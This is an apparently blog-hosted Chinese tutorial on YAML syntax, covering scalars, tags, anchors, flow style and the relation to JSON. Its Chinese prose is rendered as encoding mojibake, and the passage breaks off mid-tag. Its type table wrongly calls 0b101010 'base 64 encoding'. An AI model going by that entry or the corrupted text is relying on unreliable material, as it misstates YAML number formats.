class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;dataType&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;string&quot;</span>: <span class="string">&quot;YAML&quot;</span>,</span><br><span class="line">        <span class="string">&quot;integer&quot;</span>: <span class="number">123</span>,</span><br><span class="line">        <span class="string">&quot;float&quot;</span>: <span class="number">12.345</span>,</span><br><span class="line">        <span class="string">&quot;boolean&quot;</span>: <span class="string">&quot;No&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å­—ç¬¦ä¸²ï¼ˆstringï¼‰"><a href="#å­—ç¬¦ä¸²ï¼ˆstringï¼‰" class="headerlink" title="å­—ç¬¦ä¸²ï¼ˆstringï¼‰"></a>å­—ç¬¦ä¸²ï¼ˆstringï¼‰</h3><p>å­—ç¬¦ä¸²å¯ä»¥åŠ å•å¼•å·æˆ–åŒå¼•å·æˆ–è€…æ²¡æœ‰å¼•å·ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">quoted: </span><br><span class="line">    - <span class="string">&#x27;single quoted string&#x27;</span></span><br><span class="line">    - <span class="string">&quot;double quoted strings&quot;</span></span><br><span class="line">    - withoout quoted <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢å®šä¹‰çš„å­—ç¬¦ä¸²éƒ½æ˜¯æœ‰æ•ˆçš„ï¼Œç¼–è¯‘æˆ JSON å¦‚ä¸‹ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;quoted&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;single quoted string&quot;</span>,</span><br><span class="line">        <span class="string">&quot;double quoted strings&quot;</span>,</span><br><span class="line">        <span class="string">&quot;withoout quoted string&quot;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å•è¡Œ-å¤šè¡Œæ–‡æœ¬"><a href="#å•è¡Œ-å¤šè¡Œæ–‡æœ¬" class="headerlink" title="å•è¡Œ/å¤šè¡Œæ–‡æœ¬"></a>å•è¡Œ/å¤šè¡Œæ–‡æœ¬</h3><p>æ¶‰åŠåˆ°å­—ç¬¦ä¸²è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå½“å­—ç¬¦ä¸²æ¯”è¾ƒå¤šçš„æ—¶å€™ï¼Œæ›´å¥½çš„å±•ç¤ºï¼Œé€‰æ‹©å•è¡Œ/å¤šè¡Œæ–‡æœ¬å±•ç¤ºã€‚<br>ä¾‹å¦‚ï¼Œé…ç½® GitHub Actions æ—¶å€™è¿è¡Œä¸€äº›å‘½ä»¤ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Multiline strings start with |</span><br><span class="line">execute: |</span><br><span class="line">    npm ci</span><br><span class="line">    npm build</span><br><span class="line">    npm test</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘æˆ JSONï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;execute&quot;</span>: <span class="string">&quot;npm ci\nnpm build\nnpm test\n&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼Œä½ æƒ³é€šè¿‡æ¢è¡Œè®© YAML æ›´åŠ æ˜“è¯»ï¼Œè€ŒçœŸæ­£å±•ç¤ºçš„æ—¶å€™æ˜¯å•è¡Œï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">single-line-<span class="keyword">string</span>: &gt; </span><br><span class="line">    This</span><br><span class="line">    should</span><br><span class="line">    be</span><br><span class="line">    one</span><br><span class="line">    line</span><br></pre></td></tr></table></figure><p>è¿™å°±æ˜¯å®ƒåœ¨ JSON ä¸­çš„æ ·å­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;single-line-string&quot;</span>: <span class="string">&quot;This should be one line\n&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Notion: å½“ä½¿ç”¨ &gt; å­—ç¬¦è€Œä¸æ˜¯ æ—¶ | ï¼Œæ¯ä¸€ä¸ªæ–°è¡Œéƒ½å°†è¢«è§£é‡Šä¸ºä¸€ä¸ª<strong>ç©ºæ ¼</strong>ã€‚</p><h3 id="æ•°å€¼ï¼ˆNumberï¼‰"><a href="#æ•°å€¼ï¼ˆNumberï¼‰" class="headerlink" title="æ•°å€¼ï¼ˆNumberï¼‰"></a>æ•°å€¼ï¼ˆNumberï¼‰</h3><p>æ•°å€¼æœ‰æ•´æ•°ã€å°æ•°ã€æ­£æ•°ã€è´Ÿæ•°ã€æ­£æ— ç©·å¤§ã€è´Ÿæ— ç©·å¤§ã€NaNï¼ˆnot a numberï¼‰ã€ç§‘å­¦è®¡æ•°æ³•ã€è¿›åˆ¶è¡¨ç¤ºã€‚<br>ä¾‹å¦‚ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">integer: <span class="number">12</span></span><br><span class="line">decimal: <span class="number">0.5</span></span><br><span class="line">positive: +<span class="number">12</span></span><br><span class="line">negative: <span class="number">-12</span></span><br><span class="line">positive infinity: .inf</span><br><span class="line">negative infinity: -.inf</span><br><span class="line">not a number: .nan</span><br><span class="line"># JS æ•°å€¼å¯ä»¥é€šè¿‡ä¸‹åˆ’çº¿åˆ†å‰²</span><br><span class="line">number: <span class="number">687</span>_456</span><br><span class="line">scientific counting method: <span class="number">2.3e4</span></span><br><span class="line"># äºŒè¿›åˆ¶</span><br><span class="line">binary: <span class="number">0</span>b101010</span><br></pre></td></tr></table></figure><p>é€šè¿‡ <a href="https://links.jianshu.com/go?to=https://nodeca.github.io/js-yaml/">js-yaml</a> è½¬æ¢ä¸º JS å¯¹è±¡å¦‚ä¸‹ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123; </span><br><span class="line">    integer: <span class="number">12</span>,</span><br><span class="line">    decimal: <span class="number">0.5</span>,</span><br><span class="line">    positive: <span class="number">12</span>,</span><br><span class="line">    negative: <span class="number">-12</span>,</span><br><span class="line">    <span class="string">&#x27;positive infinity&#x27;</span>: Infinity,</span><br><span class="line">    <span class="string">&#x27;negative infinity&#x27;</span>: -Infinity,</span><br><span class="line">    <span class="string">&#x27;not a number&#x27;</span>: NaN,</span><br><span class="line">    number: <span class="number">687456</span>,</span><br><span class="line">    <span class="string">&#x27;scientific counting method&#x27;</span>: <span class="number">23000</span>,</span><br><span class="line">    binary: <span class="number">42</span> </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="å¸ƒå°”ï¼ˆbooleanï¼‰"><a href="#å¸ƒå°”ï¼ˆbooleanï¼‰" class="headerlink" title="å¸ƒå°”ï¼ˆbooleanï¼‰"></a>å¸ƒå°”ï¼ˆbooleanï¼‰</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">boolean: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>ç¼–è¯‘ä¸º JSONï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;boolean&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”¨äºè¡¨ç¤ºçœŸå‡ï¼Œä½ åœ¨å…¶ä»–åœ°æ–¹å¯èƒ½çœ‹åˆ°è¿˜å¯ä»¥ä½¿ç”¨ True/False, ON/OFF, Yes/No æˆ– y/nã€‚<br>æ ¹æ®<a href="https://links.jianshu.com/go?to=https://yaml.org/spec/1.2/spec.html">YAML 1.2 è§„èŒƒæ–‡æ¡£ï¼Œ</a> â€œyesâ€å’Œâ€œnoâ€ ç­‰ä¸å†è¢«è§£é‡Šä¸ºå¸ƒå°”å€¼ã€‚<br>We have removed unique implicit typing rules and have updated these rules to align them with JSONâ€™s productions. In this version of YAML, boolean values may be serialized as â€œtrueâ€ or â€œfalseâ€;<br>æˆ‘ä»¬åˆ é™¤äº†ç‹¬ç‰¹çš„éšå¼ç±»å‹è§„åˆ™å¹¶æ›´æ–°äº†è¿™äº›è§„åˆ™ä»¥å°†å®ƒä»¬ä¸ JSON çš„äº§ç”Ÿå¼ä¿æŒä¸€è‡´ã€‚åœ¨è¿™ä¸ªç‰ˆæœ¬çš„ YAML ä¸­ï¼Œå¸ƒå°”å€¼å¯èƒ½è¢«åºåˆ—åŒ–ä¸ºâ€œtrueâ€æˆ–â€œfalseâ€ï¼›<br>ä¸è¿‡ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ !!bool æ¥è§£æå®ƒä»¬ï¼Œè¿™ä¸ªå°±å±äºæ˜¾ç¤ºå£°æ˜ç±»å‹ <em>tags</em> æ ‡ç­¾çš„å†…å®¹äº†ã€‚<br>å½“ç„¶äº†ï¼Œæˆ‘æ›´æ¨èç›´æ¥ true å’Œ false äº†ã€‚</p><h3 id="ç©ºå€¼ï¼ˆnullï¼‰"><a href="#ç©ºå€¼ï¼ˆnullï¼‰" class="headerlink" title="ç©ºå€¼ï¼ˆnullï¼‰"></a>ç©ºå€¼ï¼ˆnullï¼‰</h3><p>YAML å£°æ˜ç©ºå€¼æœ‰ä»¥ä¸‹å‡ ç§æ–¹æ³•ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">manager: null</span><br><span class="line">blank:</span><br><span class="line">tilde: ~</span><br><span class="line">title: null</span><br><span class="line">~: null key</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘æˆ JOSNï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;manager&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;blank&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;tilde&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;title&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;null&quot;</span>: <span class="string">&quot;null key&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ—¶é—´æˆ³ï¼ˆtimestampï¼‰"><a href="#æ—¶é—´æˆ³ï¼ˆtimestampï¼‰" class="headerlink" title="æ—¶é—´æˆ³ï¼ˆtimestampï¼‰"></a>æ—¶é—´æˆ³ï¼ˆtimestampï¼‰</h3><p>æ—¶é—´æˆ³è¡¨ç¤ºå•ä¸ªæ—¶é—´ç‚¹ã€‚å®ƒä½¿ç”¨ç¬¦å·å½¢å¼ ISO8601ã€‚å¦‚æœæœªæ·»åŠ æ—¶åŒºï¼Œåˆ™å‡å®šè¯¥æ—¶åŒºä¸º UTCã€‚è¦æè¿°æ—¥æœŸæ ¼å¼ï¼Œå¯ä»¥çœç•¥æ—¶é—´éƒ¨åˆ†ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ—¶é—´é»˜è®¤ä¸º00:00:00Zã€‚è¯·å‚è§ä¸‹é¢ç¤ºä¾‹ä¸­çš„ç”¨æ³•ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">time: <span class="number">2020</span><span class="number">-12</span><span class="number">-07</span>T01:<span class="number">02</span>:<span class="number">59</span>:<span class="number">34.02</span>Z</span><br><span class="line">timestamp: <span class="number">2020</span><span class="number">-12</span><span class="number">-07</span>T01:<span class="number">02</span>:<span class="number">59</span>:<span class="number">34.02</span> +<span class="number">05</span>:<span class="number">30</span></span><br><span class="line">datetime: <span class="number">2020</span><span class="number">-12</span><span class="number">-07</span>T01:<span class="number">02</span>:<span class="number">59</span>:<span class="number">34.02</span>+<span class="number">05</span>:<span class="number">30</span></span><br><span class="line">notimezone: <span class="number">2020</span><span class="number">-12</span><span class="number">-07</span>T01:<span class="number">02</span>:<span class="number">59</span>:<span class="number">34.02</span></span><br><span class="line">date: <span class="number">2020</span><span class="number">-12</span><span class="number">-07</span></span><br></pre></td></tr></table></figure><h3 id="ç±»å‹å€¼å¯¹ç…§è¡¨"><a href="#ç±»å‹å€¼å¯¹ç…§è¡¨" class="headerlink" title="ç±»å‹å€¼å¯¹ç…§è¡¨"></a>ç±»å‹å€¼å¯¹ç…§è¡¨</h3><p>æœ€åæ€»ç»“ä¸€å¼ å¯¹ç…§è¡¨ï¼š</p><table><thead><tr><th><strong>å€¼</strong></th><th><strong>æè¿°</strong></th></tr></thead><tbody><tr><td>~, null, Null</td><td>null values</td></tr><tr><td>1234</td><td>decimal</td></tr><tr><td>0b101010</td><td>binary (base 64 encoding)</td></tr><tr><td>0x12AD</td><td>hexadecimal</td></tr><tr><td>02677</td><td>octal</td></tr><tr><td>.inf, -.Inf</td><td>infinity</td></tr><tr><td>.NAN</td><td>not a number</td></tr><tr><td>true</td><td>true</td></tr><tr><td>false</td><td>false</td></tr><tr><td>2020-12-07</td><td>date or timestamps</td></tr><tr><td>123_456.78</td><td>floating point or decimal numbers</td></tr><tr><td>123.45e+78</td><td>exponential numbers</td></tr></tbody></table><h3 id="æ˜¾ç¤ºç±»å‹"><a href="#æ˜¾ç¤ºç±»å‹" class="headerlink" title="æ˜¾ç¤ºç±»å‹"></a>æ˜¾ç¤ºç±»å‹</h3><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒYAML ä¼šè‡ªåŠ¨æ¨æ–­æ•°æ®ç±»å‹ï¼Œå°±åƒ TypeScript çš„ç±»å‹æ¨æ–­ä¸€æ ·ï¼Œä½†æ˜¯å½“ä½ éœ€è¦ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ æ ‡ç­¾ï¼ˆtagsï¼‰æ˜¾ç¤ºæŒ‡å®šç±»å‹ï¼Œæ¯”å¦‚æ•´æ•°ç±»å‹ ä¸¤ä¸ªè‹±æ–‡æ„Ÿå¹å· !! å†åŠ ä¸Š int å°±å˜æˆäº†ä¸€ä¸ªæ•´æ•° tag â€”â€”!!intã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># The following value should be an <span class="keyword">int</span>, no matter what:</span><br><span class="line">should-be-<span class="keyword">int</span>: !!<span class="keyword">int</span> <span class="number">3.2</span></span><br><span class="line"></span><br><span class="line"># Parse any value to <span class="keyword">string</span>:</span><br><span class="line">should-be-<span class="keyword">string</span>: !!str <span class="number">30.25</span></span><br><span class="line"></span><br><span class="line"># I need the next value to be boolean:</span><br><span class="line">should-be-boolean: !!<span class="keyword">bool</span> yes</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘æˆ JSONï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;should-be-int&quot;</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="string">&quot;should-be-string&quot;</span>: <span class="string">&quot;30.25&quot;</span>,</span><br><span class="line">    <span class="string">&quot;should-be-boolean&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘è¿™é‡Œä¹Ÿæ•´ç†äº†ä¸€å¼ è¡¨ï¼š</p><table><thead><tr><th><strong>tags</strong></th><th><strong>description</strong></th></tr></thead><tbody><tr><td>!!int</td><td>integer</td></tr><tr><td>!!float</td><td>float</td></tr><tr><td>!!str</td><td>string</td></tr><tr><td>!!bool</td><td>boolean</td></tr><tr><td>!!null</td><td>null</td></tr><tr><td>!!seq</td><td>Array</td></tr><tr><td>!!map</td><td>map</td></tr><tr><td>!!set</td><td>set</td></tr><tr><td>!!omap</td><td>order map</td></tr><tr><td>!!pairs</td><td>pairs</td></tr></tbody></table><h2 id="é«˜çº§åŠŸèƒ½"><a href="#é«˜çº§åŠŸèƒ½" class="headerlink" title="é«˜çº§åŠŸèƒ½"></a>é«˜çº§åŠŸèƒ½</h2><h3 id="ä»£ç å¤ç”¨-Node-Anchors"><a href="#ä»£ç å¤ç”¨-Node-Anchors" class="headerlink" title="ä»£ç å¤ç”¨ Node Anchors"></a>ä»£ç å¤ç”¨ <a href="https://links.jianshu.com/go?to=https://yaml.org/spec/1.2.2/%23692-node-anchors">Node Anchors</a></h3><p>ä»»ä½•ä»£ç éƒ½è®²ç©¶ä¸ªå¤ç”¨ï¼Œæœ€åŸºæœ¬çš„å°±æ˜¯å®šä¹‰å˜é‡ï¼Œä½† YAML æ— æ³•å®šä¹‰å˜é‡ï¼Œé‚£ä¹ˆæ€ä¹ˆåšä»£ç å¤ç”¨æ¥ï¼ŒYAML æœ‰è‡ªå·±çš„è§£å†³æ–¹æ¡ˆï¼Œé€šè¿‡ <a href="https://links.jianshu.com/go?to=https://yaml.org/spec/1.2.2/%23692-node-anchors">Node Anchors</a>ã€‚<br>ä¾‹å¦‚ï¼Œå¤ç”¨ Value å€¼ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">First occurrence: &amp;anchor Value</span><br><span class="line">Second occurrence: *anchor</span><br></pre></td></tr></table></figure><p>å¯¹åº”çš„ JSON æ–‡ä»¶ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;First occurrence&quot;</span>: <span class="string">&quot;Value&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Second occurrence&quot;</span>: <span class="string">&quot;Value&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡ &amp; æ ‡è®°ä¸€ä¸ªèŠ‚ç‚¹ï¼Œä½¿ç”¨ * å­—ç¬¦å¼•ç”¨å®ƒï¼Œä»è€Œè¾¾åˆ°å¤ç”¨ã€‚</p><h3 id="å—æ ·å¼å’Œæµæ ·å¼"><a href="#å—æ ·å¼å’Œæµæ ·å¼" class="headerlink" title="å—æ ·å¼å’Œæµæ ·å¼"></a>å—æ ·å¼å’Œæµæ ·å¼</h3><h4 id="å—æ ·å¼"><a href="#å—æ ·å¼" class="headerlink" title="å—æ ·å¼"></a>å—æ ·å¼</h4><p>åœ¨æ–‡æ¡£<strong>å—æ ·å¼</strong>ä½¿ç”¨å—ç”¨äºç»“æ„åŒ–æ–‡æ¡£ã€‚å®ƒæ›´å®¹æ˜“é˜…è¯»ï¼Œä½†ä¸é‚£ä¹ˆç´§å‡‘ï¼Œ<strong>ä¾‹å­</strong>ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">color: </span><br><span class="line">  - red</span><br><span class="line">  - yellow</span><br><span class="line">  - blue</span><br></pre></td></tr></table></figure><h4 id="æµæ ·å¼"><a href="#æµæ ·å¼" class="headerlink" title="æµæ ·å¼"></a>æµæ ·å¼</h4><p>YAMLæœ‰ä¸€ç§ç§°ä¸º<strong>flow style</strong>çš„æ›¿ä»£è¯­æ³•ï¼Œå®ƒå…è®¸åœ¨ä¸ä¾èµ–ç¼©è¿›çš„æƒ…å†µä¸‹å†…è”ç¼–å†™_åºåˆ—_å’Œ_æ˜ å°„_ï¼Œåˆ†åˆ«ä½¿ç”¨ä¸€å¯¹æ–¹æ‹¬å·[]å’Œå¤§æ‹¬å·{}ã€‚<br>Flow é£æ ¼æ˜¯JSON. å®ƒä¸å¤ªå®¹æ˜“é˜…è¯»ï¼›ç„¶è€Œï¼Œå®ƒæä¾›äº†æ›´å¤šçš„ç´§å‡‘æ€§ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">color: [red, blue]</span><br></pre></td></tr></table></figure><p>å’Œ</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- &#123; name: <span class="string">&quot;CondorHero&quot;</span>, age: <span class="number">18</span> &#125; </span><br></pre></td></tr></table></figure><h2 id="YAML-ä¸-JSON-çš„å…³ç³»"><a href="#YAML-ä¸-JSON-çš„å…³ç³»" class="headerlink" title="YAML ä¸ JSON çš„å…³ç³»"></a>YAML ä¸ JSON çš„å…³ç³»</h2><p>ä½ å¯èƒ½å¬è¯´è¿‡ YAML å’Œ JSON ä¹‹é—´çš„è¶…é›†ä¸å­é›†è¿™æ ·çš„å…³ç³»ï¼Œè¿™ä¸ªå¯ä»¥æ¨èä½ é˜…è¯» YAML1.2 ç‰ˆæœ¬çš„å®˜æ–¹æ–‡æ¡£ 1.3 å°èŠ‚ <a href="https://links.jianshu.com/go?to=https://yaml.org/spec/1.2-old/spec.html%23id2759572">Relation to JSON</a>ã€‚<br>è¿™é‡Œå·æ¥ Google ç¿»è¯‘çš„ï¼š</p><p><img src="http://106.12.125.218/medias/medias/yaml%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9C%80%E8%A6%81%E4%BA%86%E8%A7%A3%E7%9A%84%E7%82%B9/1.png"><br>å®è·µä¸­ä¹Ÿæ˜¯å¦‚æ­¤ï¼›æ¯ä¸ª JSON æ–‡ä»¶ä¹Ÿæ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ YAML æ–‡ä»¶ã€‚</p><h2 id="XMLã€JSONã€YAML"><a href="#XMLã€JSONã€YAML" class="headerlink" title="XMLã€JSONã€YAML"></a>XMLã€JSONã€YAML</h2><p>çœ‹ä¸‹å›¾ï¼Œä»å·¦å¾€å³æ˜¯ XMLã€JSONã€YAML æ–‡ä»¶ï¼ŒJSON é€šè¿‡ {} å’Œ [] ç­‰ç®€åŒ–äº† XMLï¼Œå˜å¾—æ›´åŠ ç›´è§‚ï¼Œä½†æ˜¯å½“åµŒå¥—è¿‡æ·± XML éœ€è¦æ‰¾ç»“å°¾æ ‡ç­¾ï¼ŒJSON éœ€è¦æ‰¾ç»“å°¾çš„ }ï¼Œæ— è®º XML è¿˜æ˜¯ JSON éƒ½éœ€è¦æ‰¾ç»“å°¾æ ‡è®°ï¼Œå¾ˆä¸ç›´è§‚ï¼Œä½† YAML ç›´æ¥åšçš„æ¯” JSON æ›´åŠ æ¿€è¿›ï¼Œè¿ç¬¦å·éƒ½æ²¡äº†ï¼Œç«‹ä½“ç»“æ„ä¹Ÿå˜å¾—æ‰å¹³äº†ï¼Œæ›´åŠ ç¬¦åˆäººç±»é˜…è¯»ä¹ æƒ¯ã€‚</p><p><img src="http://106.12.125.218/medias/medias/yaml%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9C%80%E8%A6%81%E4%BA%86%E8%A7%A3%E7%9A%84%E7%82%B9/2.png"><br>å½“æˆ‘ä»¬ä» XML è¿‡æ¸¡åˆ° JSON çš„æ—¶å€™ï¼Œä½ ä¼šæƒŠå¹ï¼Œå“‡å“¦ï¼Œå°‘äº†è¿™ä¹ˆå¤šå­—ç¬¦ï¼Œä¼˜é›…çš„ç¬¦å·å˜ç°æ›´åŠ ç›´è§‚ï¼Œè¿™çœŸæ˜¯ç»ç»å­ï¼Œç°åœ¨å½“ä½ çœ‹åˆ° YAMLï¼Œä»”ç»†äº†è§£äº†å®ƒçš„è¯­æ³•ï¼Œè‚¯å®šæƒŠå‘¼ï¼Œå“‡å“¦ï¼Œè¿™ä¹ˆç®€æ´çš„å—ï¼Œé‚£ç§æ„Ÿå—ä¸äºšäºä» XML è¿‡æ¸¡åˆ° JSONã€‚<br>å¦‚æœä½ ç†Ÿæ‚‰ Markdown å’Œ HTMLï¼ŒYAML çš„ä¼˜é›…å†™æ³•ä¸æ¯«ä¸äºšäºä» HTML è¿ç§»åˆ° Markdown ã€‚<br>ä½†æ˜¯è¯·æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼ŒYAML é©å‘½ JOSN åªé™å®šåœ¨ä¹¦å†™é…ç½®æ–‡ä»¶è¿™ä¸ªé¢†åŸŸï¼Œä¸åŒè®¾å¤‡çš„æ•°æ®äº¤äº’ï¼Œä¾ç„¶æ˜¯ JSONï¼Œå› ä¸ºå®ƒè·å¾—æ›´å¥½çš„å…¼å®¹æ€§æ›´èƒ½è¢«å¤§å¤šå±äºè¯­è¨€è¯†åˆ«ã€‚</p><h2 id="YAML-é¢‘ç¹å‡ºç°åœ¨å“ªäº›åº”ç”¨ä¸Š"><a href="#YAML-é¢‘ç¹å‡ºç°åœ¨å“ªäº›åº”ç”¨ä¸Š" class="headerlink" title="YAML é¢‘ç¹å‡ºç°åœ¨å“ªäº›åº”ç”¨ä¸Š"></a>YAML é¢‘ç¹å‡ºç°åœ¨å“ªäº›åº”ç”¨ä¸Š</h2><p>ä½ æˆ–å¤šæˆ–å°‘è‚¯å®šç”¨è¿‡ YAML ä½œä¸ºé…ç½®æ–‡ä»¶ï¼Œä½†ä½ å¯èƒ½æƒ³ä¸åˆ°å®ƒå·²ç»å¤§è§„æ¨¡çš„åº”ç”¨åˆ°å„ç§åº”ç”¨ä¸Šã€‚<br>æ¯”å¦‚ï¼š</p><ul><li>GitHub Action</li><li>Swagger</li><li>VuePress ç­‰å„ç§åšå®¢çš„é…ç½®æ–‡ä»¶</li><li>Docker</li><li>Kubernetes(K8s)</li><li>Ansible</li><li>Azure DevOps</li><li>Jenkins</li><li>â€¦</li></ul><p>å¯¹äºå‰ç«¯ï¼Œç”šè‡³å¯ä»¥å¤§èƒ†æƒ³è±¡ï¼Œä»ç®€å•æ˜“è¯»çš„æ–¹é¢æ¥è®²ï¼Œå‰ç«¯ Babelã€Eslintã€TypeScript ç­‰é…ç½®æ–‡ä»¶å®Œå…¨å¯ä»¥ç›´æ¥ YAML å–ä»£ã€‚<br>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå„ä¸ªè¯­è¨€æ— æ³•ç›´æ¥è¯†åˆ« YAML æ–‡ä»¶ï¼Œéœ€è¦å€ŸåŠ©å¯¹åº”è¯­è¨€å¯¹åº” YAML åº“ï¼Œä¾‹å¦‚ Python æ˜¯ PyYAMLã€Go æ˜¯ go-yamã€JavaScript æ˜¯ js-yaml ç­‰ç­‰ã€‚</p><h2 id="å·¥å…·æ±‡æ€»"><a href="#å·¥å…·æ±‡æ€»" class="headerlink" title="å·¥å…·æ±‡æ€»"></a>å·¥å…·æ±‡æ€»</h2><p>å› ä¸ºå„ç§è¯­è¨€æ²¡æœ‰å¯¹ YAML æä¾›äº†åŸç”Ÿæ”¯æŒï¼Œæ‰€ä»¥è¿˜æ˜¯åœ¨çº¿è°ƒè¯•æ¯”è¾ƒæ–¹ä¾¿ï¼Œä¸‹é¢æ˜¯æˆ‘ç”¨åˆ°çš„å‡ ä¸ªä½¿ç”¨ YAML ç½‘ç«™ï¼Œä¸»è¦åŒ…æ‹¬äº†<strong>æ ¡éªŒã€ç¾åŒ–ã€è½¬æ¢</strong>ã€‚</p><ol><li>æ ¡éªŒ YAML è¯­æ³•çš„æ­£ç¡®æ€§<ul><li><a href="https://links.jianshu.com/go?to=http://www.yamllint.com/">YAML Lint</a></li><li><a href="https://links.jianshu.com/go?to=https://codebeautify.org/yaml-validator">YAML Validator</a></li></ul></li><li>ç¾åŒ–<ul><li><a 